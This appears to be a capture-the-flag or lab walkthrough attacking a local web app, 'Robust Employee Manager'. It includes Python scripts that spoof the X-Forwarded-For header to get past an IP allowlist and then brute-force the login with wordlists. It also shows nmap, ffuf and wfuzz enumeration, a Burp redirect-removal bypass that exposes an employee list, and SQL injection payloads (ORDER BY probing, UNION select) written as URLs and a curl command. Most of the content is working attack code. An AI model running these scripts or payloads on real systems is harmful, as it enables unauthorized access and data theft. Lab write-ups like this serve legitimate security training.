# target IP 192.168.86.200

![](https://github.com/user-attachments/assets/5a52c98f-0526-4c6b-a8e2-22820aaca06c)

```py
import requests

url = "http://192.168.86.200/login.php"

for i in range(256):
    ip = f"10.10.10.{i}"
    headers = {"X-Forwarded-For": ip}
    response = requests.get(url=url, headers=headers)
    # 실제 나오는 응답 확인
    if "Your IP is not allowed" not in response.text:
        print(f"[-] {ip}, status: {response.status_code}")
        # 응답 본문 일부 출력
        print(response.text[:300])
    else:
        print(f"[+] {ip}, status: {response.status_code}")
         print(response.text[:300])

```

![](https://github.com/user-attachments/assets/65642d09-9464-44c9-9607-9a82cfb5e825)

???(kali?kali)-[~]
??$ sudo python3 requests_3.py  
[+] Found working IP: 10.10.10.0

```py
import requests

url = "http://192.168.86.200/login.php"

for i in range(256):
    ip = f"10.10.10.{i}"
    headers = {"X-Forwarded-For": ip}
    response = requests.get(url=url, headers=headers)

    # 에러 메시지가 포함되어 있는지 확인
    if "not allowed" not in response.text:
        print(f"[+] Found working IP: {ip}")
        print(response.text)
        break
    else:
        print(f"[-] Blocked: {ip}", end="\r")

```

![](https://github.com/user-attachments/assets/42b33d1b-216f-4276-830a-7f39b64da66c)

```html
<!DOCTYPE html>
<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>
  <body>
    <h2>Robust Employee Manager</h2>

    <form id="login-form" method="post" target="_self">
      <div class="imgcontainer">
        <img src="emp.png" alt="Avatar" class="avatar" />
      </div>
      <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" placeholder="Enter Username" name="user" required />

        <label for="psw"><br /><b>Password</b></label>
        <input
          type="password"
          placeholder="Enter Password"
          name="password"
          required
        />

        <br /><button type="submit">Login</button>
      </div>
    </form>
  </body>
</html>
```

# burpsuite proxy header setting

![](https://github.com/user-attachments/assets/4b5a181d-00e8-4e41-aff4-fba23c156394)

![](https://github.com/user-attachments/assets/d46530b3-94d5-4e12-bb5b-544b5bbbbd0a)

# Bruteforce with X-Forwarded-For

![](https://github.com/user-attachments/assets/b204e331-2ed9-4d53-97ff-a62df3991c52)
![](https://github.com/user-attachments/assets/61dbf70e-0933-4e0a-acd2-71a43e2a8e2b)

```py
# python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
import argparse

import requests


def load_lines(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def brute_force(url, xff_ip, username_file, password_file, timeout=5):
    headers = {
        "X-Forwarded-For": xff_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebkit/537.36 (KHTML, like Gecko)",
    }

    try:
        usernames = load_lines(username_file)
        passwords = load_lines(password_file)
    except FileNotFoundError as e:
        print(f"not found file {e.filename}")
        return

    total = len(usernames) * len(passwords)
    done = 0

    print(f"[+] loaded {len(usernames)}/{len(passwords)}")
    print(f"[+] total combinations: {total}")
    print("[+] starting bruteforce")

    for user in usernames:
        for pwd in passwords:
            data = {"user": user, "password": pwd}

            try:
                response = requests.post(
                    url=url, headers=headers, data=data, timeout=timeout
                )

                # print(f"code: {response.status_code}")
                if (response.status_code) == 200:
                    # print(f"found {user}/{pwd}")
                    # print(f"len content:{len(response.text)}")
                    print("200")
                if len(response.text) != 1770:
                    print(f"not 1770: {user}/{pwd}")
                    return
            except requests.exceptions.RequestException as e:
                print(f"error: {e}")
            finally:
                # 현재 진행도를 "완료/전체" 형식으로 표시
                done += 1
                pct = (done / total) * 100 if total else 0
                print(
                    f"\r[-] progress: {done}/{total} ({pct:.1f}%)", end="", flush=True
                )

    print(f"\n[-] bruteforce finished")


def parse_args():
    parser = argparse.ArgumentParser(description="X-Forwarded-for")

    parser.add_argument("-u", "--url", default="http://127.0.0.1/login.php")

    parser.add_argument(
        "-x", "--xff", default="10.10.10.10", help="X-Forwarded-For 에 넣을 IP"
    )

    parser.add_argument(
        "-U", "--usernames", default="usernames.txt", help="user file path"
    )

    parser.add_argument(
        "-P", "--passwords", default="password.txt", help="password file path"
    )

    parser.add_argument("-t", "--timeout", type=int, default=5, help="timeout")

    return parser.parse_args()


def main():
    args = parse_args()
    brute_force(args.url, args.xff, args.usernames, args.passwords, args.timeout)


if __name__ == "__main__":
    main()

```

> python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "/usr/share/seclists/Usernames/top-usernames-shortlist.txt --passwords" "/usr/share/seclists/Passwords/Common-Credentials/Pwdb_top-10000.txt"

- It shows all 200 status code

![It shows all 200 status code](https://github.com/user-attachments/assets/c825f7f2-d66e-4cfd-87ea-e79ce9d6afe6)

- It Shows 1770 lenth
  ![](https://github.com/user-attachments/assets/5959b6eb-079e-4556-ad73-c1c4777bf7fb)
- bruteforce -> not found
  ![](https://github.com/user-attachments/assets/ea32b22b-817e-41fe-ab4e-876f515a1f68)

> sudo nmap 192.168.86.200 -Pn --open -sC -sV -O -oN scan.txt

![](https://github.com/user-attachments/assets/0a3fab28-54dc-43c2-b2bf-fd8b8d77bfb6)

- -fc -> exclude

# subdomain not found

> ffuf -u http://192.168.86.200 -H "Host:FUZZ.192.168.86.200" -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fc 404 -t 50 > result_ffuf.txt

![](https://github.com/user-attachments/assets/308d2792-239c-42d7-a9d4-6f9e9fcd38b2)

# found -> ip, IP, login, Login, LOGIN, home, Home, index, Index.php

> ffuf -u http://192.168.86.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404 -t 50

![](https://github.com/user-attachments/assets/a1f68392-76c7-4a9e-a7d2-34aaa8b2d1a9)

# found -> login, nul.php

> ffuf -u http://192.168.86.200/FUZZ.php -H "X-Forwarded-For: 10.10.10.0" -w /usr/share/wordlists/wfuzz/general/big.txt -fc 404,302 -t 50

![](https://github.com/user-attachments/assets/b31c29fa-9d2e-4f84-a52f-3927fd19d6f2)

# found -> home, index.php

- --sc 302 -> look only 302

> wfuzz -H "X-Forwarded-For: 10.10.10.0" --sc 302 -u http://192.168.86.200/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt

![](https://github.com/user-attachments/assets/4c297cf5-6263-4d78-86b6-b42ce97faf95)

# 192.168.86.200/home.php

# turn on intercept server to client requests

![](https://github.com/user-attachments/assets/52870492-12ad-4c6a-b425-6431ea834183)

![](https://github.com/user-attachments/assets/a20c7c6a-2c8a-4a80-a4b3-09f3ab6d3b33)

# remove location in response header

![](https://github.com/user-attachments/assets/3d5cea36-2007-4457-84d8-0b2f491b5a99)

# arrived at 192.168.86.200/home.php

![](https://github.com/user-attachments/assets/6d0a563d-3a0c-44e1-a7bc-b9fd16473f61)

- 1 Desireef Joubert 2007-04-01
  2 Blythe Weatherall 2007-05-10
  3 Felisha Bookman 2006-03-12
  4 Natacha Pua 2007-11-24
  5 Chante Fenske 2007-12-28

# set response Location: login.php -> "" in burpsuite

![](https://github.com/user-attachments/assets/39be4057-a9f0-4f9b-9314-6bcd1a99e36c)

![](https://github.com/user-attachments/assets/5cba9e70-6ee3-4a82-ae48-6474dede1b34)
![](https://github.com/user-attachments/assets/b61dc57f-df95-4070-8d04-226a6f6a588a)

- Id First name Last name Birth date Actions
  6 Amado Grimaldi 2007-06-18
  7 Valery Files 2007-03-08
  8 Taryn Carbone 2007-08-01
  9 Julissa Spengler 2007-01-31
  10 Brain Spagnuolo 2007-09-23

# try SQLI PoC

> ' ORDER BY 1-- -

## check colume count -> 4

> ' ORDER BY 1-- -

> http://192.168.86.200/home.php?action=search&first_name=%27+ORDER+BY+5--+-&last_name=
> ![ORDER BY 4 works - employees sorted by birth date](https://github.com/user-attachments/assets/c0f6c22b-308b-4ba4-a612-bffc0560d2a2)
> ![ORDER BY 1 works - employees sorted by Id](https://github.com/user-attachments/assets/da2e1c59-ea9c-4da1-8a15-b9f00c85f795)
> ![ORDER BY 5 fails - Number of Employees 0, column count is 4](https://github.com/user-attachments/assets/2f657bd3-2fce-496a-b4ad-d4a84ad053d2)

> ' UNION select * from employees'
> http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=lastname
> ![](https://github.com/user-attachments/assets/7b7a5604-d4dd-4607-b1c0-624c00dc59c8)

curl -X GET "http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+%2A+from+employees%27&last_name=lastname" -H "X-Forwarded-For: 10.10.10.0" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
